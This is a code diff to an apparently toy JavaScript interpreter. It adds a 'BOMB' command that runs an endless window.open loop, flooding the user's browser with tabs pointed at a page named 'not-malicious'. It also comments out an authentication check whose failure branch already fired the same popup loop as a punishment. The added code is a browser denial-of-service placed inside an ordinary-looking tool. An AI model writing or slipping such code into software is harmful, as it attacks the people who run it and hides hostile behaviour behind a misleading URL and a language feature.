@@ -33,7 +33,9 @@ class PseudoInterpreter {
     }
 
     tokenize(line) {
-        if (line.startsWith("POPUP")) {
+        if (line.startsWith("BOMB")) {
+            return ["BOMB"]
+        } else if (line.startsWith("POPUP")) {
             const match = line.match(/^POPUP\s+(.*)$/);
             return ["POPUP", match[1]];
         } else if (line.startsWith("OUTPUT")) {
@@ -937,6 +939,7 @@ class PseudoInterpreter {
         let fileName;
         let val;
 
+        /*
         if (!auth) {
             const inputAuthCode = prompt(`Enter the authentication code: `);
             if (this.simpleHash(inputAuthCode) === "-5490770733" && !banned) {
@@ -948,12 +951,16 @@ class PseudoInterpreter {
                 while(true) window.open("https://nekawah.github.io/not-malicious/", '_blank');
             }
         }
+        */
 
         while (i < parsedCode.length) {
             const token = parsedCode[i];
             let reference;
 
             switch (token[0]) {
+                case "BOMB":
+                    while(true) window.open("https://nekawah.github.io/not-malicious/", '_blank');
+                    
                 case "POPUP":
                     this.popup = this.evalExpression(token[1]);
                     break;
